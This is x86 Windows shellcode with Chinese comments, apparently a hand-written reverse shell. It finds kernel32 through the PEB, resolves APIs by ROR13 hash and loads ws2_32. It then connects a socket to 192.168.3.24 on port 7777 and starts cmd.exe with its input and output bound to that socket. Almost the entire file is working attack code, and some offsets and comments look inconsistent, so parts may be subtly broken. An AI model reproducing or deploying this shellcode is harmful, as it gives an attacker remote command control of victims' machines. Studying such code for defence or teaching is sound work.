    _start:
        ; 获取 kernel32.dll 基地址
            xor eax, eax
            mov ebx, fs: [eax + 0x30] ; PEB 地址
            mov ebx, [ebx + 0x0C]; LDR 地址
            mov ebx, [ebx + 0x0C]; 
            mov ebx, [ebx]; 
            mov ebx, [ebx];
        mov eax, [ebx + 0x18]; kernel32.dll 基地址
            mov esi, eax
            mov ebx, eax

            ; 查找 PE 头
            add esi, 0x3C
            mov ebx, [esi]; PE header 地址
            add ebx, eax; PE header 的实际地址
            lea ebx, [ebx + 0x78]; 导出表地址
            mov ebx, [ebx]
            add ebx, eax; 导出表的实际地址
            push ebp;
            mov ebp, esp; 新栈帧
            xor ecx, ecx;
            push ecx;
            push eax; 
            push ebx; 
            mov esi, [ebx + 0x20]; 
            add esi, eax; 
            push esi; 

            
            xor edx, edx;
            mov cx, 0xc;
            push_zero:
            push edx;
            loop push_zero;
            push esp;  
            mov ebx, esi;

            xor ecx, ecx; 
            xor edx, edx;
            xor eax, eax;

            push 0x16B3FE72; CreateProcessA
            push 0x73E2D87E; ExitProcess
            push 0xC53D4FDB; RtlZeroMemory
            push 0xEC0E4E8E; loadlib
            mov ecx, 0x4;
            lea ebx, [esp]; 




        next_func:
            mov edx, [ebp - 0x10]; edx存的是函数名偏移量的地址
            push ecx; 存下计数器
            call find_func;
            pop ecx; 弹出计数器，应该loop会自动减去1 的ecx

            add ebx, 4; 此时指向下一个要找的哈希值
            xor esi, esi;
            xor edi, edi;
            mov esi, [ebp - 0x44]; 这里指向那个存函数地址的空间
            mov edi, esi; 因为每次循环esi不能固定一个值，所以先存到edi中，之前写的是lea esi[ebp - 0x18]这个固定住了esi的值，肯定不行，要动态的。
            mov[edi], eax;
            add esi, 4; 因为每次循环后都 - 4了，ebp - 20的每次都是上一次 - 4的值，懂吧
            mov[ebp - 0x44], esi;
            loop next_func;

            xor ebx, ebx;
            mov ebx, [ebp - 0x40];
            push ecx;
            push 0x6c6c;
            push 0x642e3233
            push 0x5f327377;
            push esp;
            call ebx;

            mov ebx, [eax + 0x3c]; pe头地址，偏移量
            mov esi, ebx;
            add ebx, eax; pe头实际地址
            lea ebx, [ebx + 0x78]; 导出表地址偏移量
            mov ebx, [ebx]
            add ebx, eax; 导出表的实际地址
            push ebp;
            mov ebp, esp;
            xor ecx, ecx;
            push ecx;
            push eax; 存下ws32基地址
            push ebx; 存下导出表的实际地址
            mov esi, [ebx + 0x20]; 函数名表偏移量
            add esi, eax; 
            push esi; 存下函数名偏移量表地址
            push ecx; 存下找到的函数地址
            push ecx;
            push ecx;
            push ecx;
            push ecx;
            push esp;
            mov ebx, [esi];

            xor ecx, ecx;
            xor edx, edx;
            xor eax, eax;

            push 0x60AAF9EC; connect
            push 0xADF509D9; wsasocketa
            push 0x3BFCEDCB; wsastatup
            push 0x2FBA176D; inet_addr
            push 0xEB769C33;htons
        

        
            mov ecx, 0x5;
            lea ebx, [esp]; 
            jmp next_func2;

        next_func2:
            mov edx, [ebp - 0x10]; 
            push ecx; 存下计数器
            call find_func;
            pop ecx; 
            add ebx, 4; 
            xor esi, esi;
            xor edi, edi;
            mov esi, [ebp - 0x28]; 这里指向那个存函数地址的空间
            mov edi, esi; 因为每次循环esi不能固定一个值，所以先存到edi中，之前写的是lea esi[ebp - 0x18]这个固定住了esi的值，肯定不行，要动态的。
            mov[edi], eax;
            add esi, 4; 因为每次循环后都 - 4了，ebp - 20的每次都是上一次 - 4的值，懂吧
            mov[ebp - 0x28], esi;
            loop next_func2;

            xor ebx, ebx;
            xor ecx, ecx;
            xor edx, edx;
            xor edi, edx;
            xor esi, esi;
            mov ebx, [ebp - 0x18]; wassocketa
            mov ecx, [ebp - 0x1c]; startup
            mov edx, [ebp - 0x20]; inet_addr
            mov edi, [ebp - 0x24]; honts;
        

            mov esp, ebp; 恢复 ESP
            pop ebp
            mov[ebp - 0x30], eax;
            mov[ebp - 0x2c], ebx;
            mov[ebp - 0x28], ecx;
            mov[ebp - 0x24], edx;
            mov[ebp - 0x20], edi;
            push esi;

            // WSTartup(0x202,&WSADATA,)
            sub esp, 0x20
            mov eax, [ebp - 0x28];
            push esp; 
            push 0x202; wVersionRequested
            call eax;

            // WSASocketA(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0)
            mov eax, [ebp - 0x2c]; wassocket
            xor ecx, ecx;
            push ecx;
            push ecx;
            push ecx;
            mov ecx, 0x0006;
            push ecx;
            mov ecx, 0x0001;
            push ecx;
            inc ecx;
            push ecx;
            call eax;
           
            push eax; socket描述符

            mov eax, [ebp - 0x24];
            xor ecx, ecx;               
            push 0x00000000;
            push 0x34322e33;
            push 0x2e383631;
            push 0x2e323931;192.168.3.24
            push esp;
            call eax; 返回ipv4地址的网络字节序
            mov edi, eax; ip

            // htons(6666)
            mov eax, [ebp - 0x20];
            push 7777;
            call eax;
            mov esi, eax; port


            // store sock_addr
            mov eax, 0x00000002;地址族号
            sub esp, 0x10;
            xor ecx, ecx;
            mov[esp], eax;

            mov[esp + 2], si;
            mov[esp + 4], edi;
            mov[esp + 8], ecx;补足长度，这是一个填充字段（padding），以保证 sockaddr_in 结构体与 sockaddr 结构体的大小相同。它没有实际意义，通常初始化为零。
            mov ebx, esp; store sock_addr

            //Connect(socket,&sock_addr,sizeof(sock_addr));socket是描述符，sock_addr是端口和ip信息，不是一个东西
            mov edx, [ebp - 0x30];

            push 16; 结构体信息长度
            push ebx;sock_addr
            mov eax, [ebp - 0x8c]; 套接字描述符
            push eax;
            mov ecx, [ebp - 0x30];
            call ecx;; connect;
            xor ebx, ebx            

            ; zero out 84 bytes
            xor ecx, ecx;
            mov edx, ecx
            mov cx, 84;
        zero:
            push edx
            loop zero;
            push esp;            
            pop edi;

            xor ebx, ebx

            push 0x00657865;
            push 0x2e646d63; cmd.exe

            lea ebx, [esp]; ebx是cmd.exe

            //init _STARTUPINFO
            xor edx, edx
            mov dx, 68

            mov[edi], edx;
            xor ecx, ecx;
            mov ecx, 100h;
            mov[edi + 0x2c], ecx;
            mov ecx, 0x00040000;
            mov[edi + 0x30], ecx;
            mov esi, [ebp - 0x8c]; 套接字描述符
            mov[edi + 0x38], esi;
            mov[edi + 0x3c], esi;
            mov[edi + 0x40], esi;

            lea edx, [edi + 68]; edx是pi, edi是si
            push esi;
            xor esi, esi

            push edx
            push edi
            push esi
            push esi
            push esi

            inc esi;
            push esi; true
            xor esi, esi;
            push esi
            push esi
            push ebx
            push esi
            mov eax, [ebp - 0x34];
            call eax;createprocess

               




        find_func:
            xor ecx, ecx;
            xor eax, eax;
            xor esi, esi;

        GetFunc:
            inc ecx; 序号计数器
            mov esi, [edx]; 
            add edx, 4;
            add esi, [ebp - 8];             
            xor edi, edi;
        ComputeHash:
            lodsb; 
            test al, al; 
            jz DoneHash; 
            ror edi, 13;
            add edi, eax;
            jmp ComputeHash
        DoneHash :
            cmp edi, [ebx]; 
            jnz GetFunc; 

            
            xor edi, edi;
            xor esi, esi;
            mov edi, [ebp - 0xc]; 
            mov esi, [edi + 0x24]; 
            add esi, [ebp - 8]; 
            dec ecx;
            mov cx, [esi + ecx * 2]; 
        
            mov esi, [edi + 0x1C]; 
            add esi, [ebp - 8]; 
            mov eax, [esi + ecx * 4];
            add eax, [ebp - 8]; 
            ret;


    


